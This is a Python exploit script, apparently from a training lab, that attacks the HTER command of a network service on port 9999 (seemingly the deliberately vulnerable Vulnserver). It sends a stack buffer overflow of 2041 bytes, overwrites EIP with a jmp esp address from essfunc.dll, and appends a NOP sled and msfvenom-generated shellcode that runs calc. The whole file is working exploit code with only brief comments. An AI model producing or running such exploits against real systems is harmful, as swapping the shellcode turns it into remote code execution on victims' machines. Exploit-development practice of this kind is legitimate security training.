#!/usr/bin/python3

import socket
import struct
import subprocess

target_ip = "X.X.X.X"
target_port = 9999

# function sends the attack or crash string to the target machine
def send_attack(attack_string):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(attack_string)
    s.close()

# function creates strings used to crash the application during the testing phase
def gen_crash(prepend, offset):
    #pattern = subprocess.check_output("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5100", shell=True)
    #eip = struct.pack("<I", 0x62501203)
    #eip = b"BBBBBBBB"
    eip = b"03125062"
    # the HTER command causes the generated string to be interpreted as hex characters rather than ascii representations of hex characters
    # for example,t he string of A's shows up in the debugger as A's rather than as 41's
    pattern = b"A"*offset + eip + b"C"*2000
    crash_string = prepend + pattern
    return crash_string

# function generates the attack string after successful tests witht eh crash string
def gen_attack(prepend, offset):
    pattern = b"A"*offset 
    # jmp esp found at 0x62501203 in essfunc.dll
    eip = b"03125062"
    # msfvenom -p windows/exec CMD="calc" -f hex -b "\x00"
    # payload must be in hex format due to the HTER command's behavior
    buf = b"d9c0d97424f45ebf791b80eb2bc9b13083eefc317e14037e6df97517657f75e875e0ff0d44209b46f690ef0bfa5bbdbf892e6acf3a844cfebbb5ad613fc4e1417e07f480477af5d110f0a8c5154c716d6540f1923d63d004363af2a79b36bbbff873754bca08849d03f02be0ac0335240afc405c6981529b105dd638b21640e543fa176e4fb75c285346b0426fc33785e6971301a34c3d1009224242f29be6081ecf9a52740e28e93a1032f26a790379e5fe9ca842f0d6f1e299be63b7c7405efbf1c26b8305da1986425cf1fadb09f5a9dc1b962c4fc759"
    # exploit will not work without nopsled
    nops = b"90" * 24
    attack_string = prepend + pattern + eip + nops + buf
    return attack_string

# defines the command in prepend, the offset, and calls the appropriate function for testing or explotiation
def main():
    prepend = b"HTER "
    offset = 2041
    crash_string = gen_attack(prepend, offset)
    send_attack(crash_string)

if __name__ == "__main__":
    main()
